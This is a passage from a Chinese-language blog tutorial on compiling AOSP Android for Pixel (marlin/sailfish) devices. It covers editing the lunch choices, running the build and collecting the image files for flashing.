aosp_x86-eng</span></span><br><span class="line"><span class="string">     22. aosp_x86_64-eng</span></span><br><span class="line"><span class="string">     23. beagle_x15-userdebug</span></span><br><span class="line"><span class="string">     24. fuchsia_arm64-eng</span></span><br><span class="line"><span class="string">     25. fuchsia_x86_64-eng</span></span><br><span class="line"><span class="string">     26. hikey-userdebug</span></span><br><span class="line"><span class="string">     27. hikey64_only-userdebug</span></span><br><span class="line"><span class="string">     28. hikey960-userdebug</span></span><br><span class="line"><span class="string">     29. hikey960_tv-userdebug</span></span><br><span class="line"><span class="string">     30. hikey_tv-userdebug</span></span><br><span class="line"><span class="string">     31. m_e_arm-userdebug</span></span><br><span class="line"><span class="string">     32. mini_emulator_arm64-userdebug</span></span><br><span class="line"><span class="string">     33. mini_emulator_x86-userdebug</span></span><br><span class="line"><span class="string">     34. mini_emulator_x86_64-userdebug</span></span><br><span class="line"><span class="string">     35. poplar-eng</span></span><br><span class="line"><span class="string">     36. poplar-user</span></span><br><span class="line"><span class="string">     37. poplar-userdebug</span></span><br><span class="line"><span class="string">     38. qemu_trusty_arm64-userdebug</span></span><br><span class="line"><span class="string">     39. uml-userdebug</span></span><br><span class="line"><span class="string">这里sailfish没有显示user和eng版本，需要手动开启。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd ~/bin/aosp/</span></span><br><span class="line"><span class="string">nano device/google/marlin/AndroidProducts.mk</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 在下边配置汇总增加user和eng</span></span><br><span class="line"><span class="string">COMMON_LUNCH_CHOICES := \</span></span><br><span class="line"><span class="string">        aosp_marlin-userdebug \</span></span><br><span class="line"><span class="string">        aosp_marlin-user \</span></span><br><span class="line"><span class="string">        aosp_marlin-end \</span></span><br><span class="line"><span class="string">        aosp_sailfish-userdebug \</span></span><br><span class="line"><span class="string">        aosp_sailfish-user \</span></span><br><span class="line"><span class="string">        aosp_sailfish-end</span></span><br></pre></td></tr></table></figure>

<p>之后再次运行如下操作，进行编译。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">lunch <span class="comment"># 输入要编译的版本</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215230347.png" alt="Image"></p>
<p>进行编译，这里的 <code>-j</code>指的是要分配多少个CPU核心处理编译这个任务，<strong>注意不要乱填，根据实际情况来填写，不然编译到后边会报错。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j4</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215248243.png" alt="Image"></p>
<p>编译完成后会生成几个对应的镜像文件**~&#x2F;bin&#x2F;aosp&#x2F;out&#x2F;target&#x2F;product&#x2F;手机代号&#x2F;**文件夹下</p>
<ul>
<li>vendor.img</li>
<li>system_other.img</li>
<li>system.img</li>
<li>boot.img</li>
</ul>
<p>将这些文件copy出来，用来进行刷机用。</p>

      
	</div>

<div class="meta">
	
</div>
</article>



    </div>
    <footer id="footer">
    <div style="display:inline">
    Copyright &copy; 2023

    Mask安全小组

</div>


    </footer>
    <script src="/javascripts/fabric.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script>
 <!-- Delete or comment this line to disable Fancybox -->



<!-- end toload --> 
</div>
</div>
<script src="/javascripts/jquery.ui.totop.js" type="text/javascript"></script>
<script type="text/javascript">
/*<![CDATA[*/
;(function($){$().UItoTop({easingType:'easeOutCirc'});})(jQuery); 
/*]]>*/
</script><!-- remove it to remove the scroll to top button -->
</body>
</html>
